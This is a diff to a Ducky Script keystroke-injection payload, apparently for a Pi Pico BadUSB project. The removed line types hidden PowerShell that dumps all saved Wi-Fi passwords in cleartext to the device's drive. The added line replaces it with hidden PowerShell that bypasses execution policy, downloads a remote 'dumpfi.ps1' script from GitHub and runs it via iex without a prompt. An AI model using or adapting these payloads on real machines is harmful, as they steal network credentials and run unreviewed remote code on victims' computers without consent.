@@ -4,5 +4,5 @@
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -windowstyle hidden -command "[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); if([System.Windows.Forms.MessageBox]::Show('Warning: This will dump all saved Wi-Fi passwords onto the CIRCUITPY drive (D:). Continue?', 'Warning', 'OKCancel', 'Warning') -eq 'OK') { netsh wlan show profiles | ForEach-Object { $profile = $_ -match ':(.+)$' | Out-Null; if ($profile) { $name = $matches[1].Trim(); $pw = netsh wlan show profile name='$name' key=clear | Select-String 'Key Content' | ForEach-Object { $_.ToString().Split(':')[1].Trim() }; Add-Content -Path 'D:\\wifi_passwords.txt' -Value \"$name : $pw\" } } }"
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr -useb 'https://raw.githubusercontent.com/StuffzEZ/PiPo-Ducky/refs/heads/scripts/potentially-malicious/CLICK-ONCE-YOU-HAVE-READ-THE-FILE-BELOW/ps1/dumpfi.ps1' | iex"
 ENTER
